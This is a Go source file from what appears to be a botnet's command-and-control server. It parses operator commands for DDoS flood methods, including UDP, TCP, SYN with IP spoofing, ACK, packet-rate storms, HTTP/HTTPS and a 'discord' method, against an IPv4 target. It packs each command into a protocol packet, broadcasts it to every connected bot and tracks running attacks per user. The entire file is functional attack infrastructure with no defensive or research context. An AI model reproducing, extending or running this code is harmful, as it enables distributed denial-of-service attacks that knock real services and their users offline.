// language: Go, file: cnc/internal/attack/attack.go
// *console command -> protocol packet -> fan out to bots. args per locked spec.*
package attack

import (
	"errors"
	"fmt"
	"net"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"bigheights/cnc/internal/protocol"
	"bigheights/cnc/internal/registry"
)

// Request is a parsed, validated attack from the console.
type Request struct {
	Method   uint8
	MethodNm string
	Target   net.IP
	Duration uint8
	Port     uint16
	Threads  uint8
	PID      uint32

	// per-method options
	Len    uint16 // udp, tcp, pps
	Flags  uint8  // tcpraw, syn, ack
	TOS    uint8
	Seq    uint32
	Spoof  uint8
	PpsMin uint16 // storm
	PpsMax uint16
	Path   []byte // http, https
	ReqM   uint8  // http: 0=GET 1=POST
	Keep   uint8
	Endpoint uint32 // discord, net order
}

// Method arg spec — mirrors the locked table.
type spec struct {
	required []string
	allowed  map[string]bool
}

var specs = map[string]spec{
	"udp":     {[]string{"port"}, set("port", "threads", "len")},
	"tcp":     {[]string{"port"}, set("port", "threads", "len")},
	"tcpraw":  {[]string{"port"}, set("port", "threads", "flags", "tos", "seq")},
	"ack":     {[]string{"port"}, set("port", "threads", "tos")},
	"syn":     {[]string{"port"}, set("port", "threads", "tos", "spoof")},
	"pps":     {[]string{"port"}, set("port", "threads", "len")},
	"storm":   {[]string{"port"}, set("port", "threads", "ppsmin", "ppsmax")},
	"hex":     {[]string{"port"}, set("port")}, // positional mode ignored
	"discord": {nil, set("threads", "endpoint")},
	"http":    {[]string{"port"}, set("port", "threads", "path", "method", "keepalive")},
	"https":   {[]string{"port"}, set("port", "threads", "path", "method", "keepalive")},
}

func set(keys ...string) map[string]bool {
	m := make(map[string]bool, len(keys))
	for _, k := range keys {
		m[k] = true
	}
	return m
}

// Parse turns "<method> <target> <duration> key=val ..." into a Request.
// Empty --bots and the rest of the options are validated here; the bots
// selection itself was dropped from the design, so nothing to parse for it.
func Parse(line string, nextPID func() uint32) (*Request, error) {
	fields := strings.Fields(line)
	if len(fields) < 3 {
		return nil, errors.New("usage: <method> <target> <duration> [key=val ...]")
	}

	name := strings.ToLower(fields[0])
	method, ok := protocol.MethodID(name)
	if !ok {
		return nil, fmt.Errorf("unknown method %q", name)
	}
	sp := specs[name]

	ip := net.ParseIP(fields[1])
	if ip == nil {
		return nil, fmt.Errorf("bad target %q", fields[1])
	}
	ip4 := ip.To4()
	if ip4 == nil {
		return nil, errors.New("only IPv4 targets supported")
	}

	dur, err := strconv.Atoi(fields[2])
	if err != nil || dur < 1 || dur > 255 {
		return nil, errors.New("duration must be 1-255 seconds")
	}

	r := &Request{
		Method:   method,
		MethodNm: name,
		Target:   ip4,
		Duration: uint8(dur),
		Threads:  1,
		PID:      nextPID(),
		PpsMin:   1024,
		PpsMax:   2400,
	}

	seen := map[string]bool{}
	for _, f := range fields[3:] {
		kv := strings.SplitN(f, "=", 2)
		if len(kv) != 2 {
			continue
		}
		k := strings.ToLower(kv[0])
		v := kv[1]
		if sp.allowed != nil && !sp.allowed[k] {
			continue // ignore unknown key for this method
		}
		seen[k] = true
		if err := r.apply(k, v); err != nil {
			return nil, err
		}
	}

	for _, req := range sp.required {
		if !seen[req] {
			return nil, fmt.Errorf("%s requires %s=", name, req)
		}
	}

	return r, nil
}

func (r *Request) apply(k, v string) error {
	switch k {
	case "port":
		n, err := strconv.Atoi(v)
		if err != nil || n < 1 || n > 65535 {
			return errors.New("port must be 1-65535")
		}
		r.Port = uint16(n)
	case "threads":
		n, err := strconv.Atoi(v)
		if err != nil || n < 1 || n > 64 {
			return errors.New("threads must be 1-64")
		}
		r.Threads = uint8(n)
	case "len":
		n, err := strconv.Atoi(v)
		if err != nil || n < 0 || n > 65535 {
			return errors.New("len must be 0-65535")
		}
		r.Len = uint16(n)
	case "flags":
		switch strings.ToLower(v) {
		case "syn": r.Flags = protocol.TCPSyn
		case "ack": r.Flags = protocol.TCPAck
		case "rst": r.Flags = protocol.TCPRst
		case "psh": r.Flags = protocol.TCPPsh
		case "all": r.Flags = protocol.TCPAll
		default:    return errors.New("flags must be syn/ack/rst/psh/all")
		}
	case "tos":
		n, err := strconv.Atoi(v)
		if err != nil || n < 0 || n > 255 {
			return errors.New("tos must be 0-255")
		}
		r.TOS = uint8(n)
	case "seq":
		n, err := strconv.ParseUint(v, 10, 32)
		if err != nil {
			return errors.New("seq must be uint32")
		}
		r.Seq = uint32(n)
	case "spoof":
		r.Spoof = boolByte(v)
	case "ppsmin":
		n, err := strconv.Atoi(v)
		if err != nil || n < 0 || n > 65535 {
			return errors.New("ppsmin out of range")
		}
		r.PpsMin = uint16(n)
	case "ppsmax":
		n, err := strconv.Atoi(v)
		if err != nil || n < 0 || n > 65535 {
			return errors.New("ppsmax out of range")
		}
		r.PpsMax = uint16(n)
	case "path":
		if len(v) > 1024 {
			return errors.New("path too long")
		}
		r.Path = []byte(v)
	case "method":
		switch strings.ToUpper(v) {
		case "GET":  r.ReqM = 0
		case "POST": r.ReqM = 1
		default:     return errors.New("method must be GET or POST")
		}
	case "keepalive":
		r.Keep = boolByte(v)
	case "endpoint":
		p := net.ParseIP(v)
		if p == nil {
			return errors.New("endpoint must be an IP")
		}
		p4 := p.To4()
		if p4 == nil {
			return errors.New("endpoint must be IPv4")
		}
		r.Endpoint = be32(p4)
	}
	return nil
}

// Build packs the Request into the exact wire bytes.
func (r *Request) Build() []byte {
	pathLen := uint16(len(r.Path))
	total := protocol.TotalSize(r.Method, pathLen)
	buf := make([]byte, total)

	h := &protocol.Header{
		Magic:    protocol.Magic,
		Version:  protocol.Version,
		Opcode:   protocol.OpAttack,
		Method:   r.Method,
		Duration: r.Duration,
		PID:      r.PID,
		TargetIP: be32(r.Target.To4()),
		Port:     r.Port,
		Threads:  r.Threads,
	}
	_ = h.Pack(buf)

	off := protocol.HeaderSize
	switch r.Method {
	case protocol.MUDP, protocol.MTCP, protocol.MPps:
		binaryPut16(buf[off:], r.Len)
	case protocol.MTCPRaw, protocol.MSyn, protocol.MAck:
		buf[off] = r.Flags
		buf[off+1] = r.TOS
		binaryPut32(buf[off+2:], r.Seq)
		buf[off+6] = r.Spoof
	case protocol.MStorm:
		binaryPut16(buf[off:], r.PpsMin)
		binaryPut16(buf[off+2:], r.PpsMax)
	case protocol.MHTTP, protocol.MHTTPS:
		buf[off] = r.Keep
		buf[off+1] = r.ReqM
		binaryPut16(buf[off+2:], pathLen)
		copy(buf[off+4:], r.Path)
	case protocol.MDiscord:
		binaryPut32(buf[off:], r.Endpoint)
	}
	return buf
}

// Dispatcher tracks running attacks and fans out to bots.
type Dispatcher struct {
	Reg   *registry.Registry
	pid   uint32

	mu      sync.Mutex
	running map[uint32]*runState
}

type runState struct {
	req     *Request
	started time.Time
	user    string
	sent    int64 // bots that accepted the packet
}

// NewDispatcher wires a dispatcher to the bot registry.
func NewDispatcher(reg *registry.Registry) *Dispatcher {
	return &Dispatcher{Reg: reg, running: map[uint32]*runState{}}
}

// NextPID is the CNC-assigned attack id generator.
func (d *Dispatcher) NextPID() uint32 { return atomic.AddUint32(&d.pid, 1) }

// Fire builds the packet, sends to every live bot, records the run.
func (d *Dispatcher) Fire(req *Request, user string) (sent int, total int) {
	pkt := req.Build()
	bots := d.Reg.Snapshot()
	total = len(bots)

	var wg sync.WaitGroup
	var ok int64
	for _, b := range bots {
		wg.Add(1)
		go func(b *registry.Bot) {
			defer wg.Done()
			if err := b.WritePacket(pkt); err == nil {
				atomic.AddInt64(&ok, 1)
			}
		}(b)
	}
	wg.Wait()

	d.mu.Lock()
	d.running[req.PID] = &runState{req: req, started: time.Now(), user: user, sent: ok}
	d.mu.Unlock()

	return int(ok), total
}

// Stop drops a running attack record. bots aren't told to stop — they run
// the duration out, per spec (no post-attack messaging either way).
func (d *Dispatcher) Stop(pid uint32) bool {
	d.mu.Lock()
	defer d.mu.Unlock()
	if _, ok := d.running[pid]; !ok {
		return false
	}
	delete(d.running, pid)
	return true
}

// StopAll clears every running attack (hold bots / Stop screen).
func (d *Dispatcher) StopAll() int {
	d.mu.Lock()
	defer d.mu.Unlock()
	n := len(d.running)
	d.running = map[uint32]*runState{}
	return n
}

// Running is what the Attacks screen renders.
type Running struct {
	PID      uint32
	User     string
	Method   string
	Target   string
	Port     uint16
	Duration uint8
	Started  time.Time
	Sent     int64
}

// List returns current running attacks for the Attacks screen.
func (d *Dispatcher) List() []Running {
	d.mu.Lock()
	defer d.mu.Unlock()
	out := make([]Running, 0, len(d.running))
	for pid, rs := range d.running {
		out = append(out, Running{
			PID:      pid,
			User:     rs.user,
			Method:   rs.req.MethodNm,
			Target:   rs.req.Target.String(),
			Port:     rs.req.Port,
			Duration: rs.req.Duration,
			Started:  rs.started,
			Sent:     rs.sent,
		})
	}
	return out
}

// helpers — avoid importing encoding/binary in two more spots

func be32(ip net.IP) uint32 {
	return uint32(ip[0])<<24 | uint32(ip[1])<<16 | uint32(ip[2])<<8 | uint32(ip[3])
}

func binaryPut16(b []byte, v uint16) { b[0] = byte(v >> 8); b[1] = byte(v) }

func binaryPut32(b []byte, v uint32) {
	b[0] = byte(v >> 24); b[1] = byte(v >> 16); b[2] = byte(v >> 8); b[3] = byte(v)
}

func boolByte(v string) uint8 {
	switch strings.ToLower(v) {
	case "1", "true", "y", "yes", "on":
		return 1
	}
	return 0
}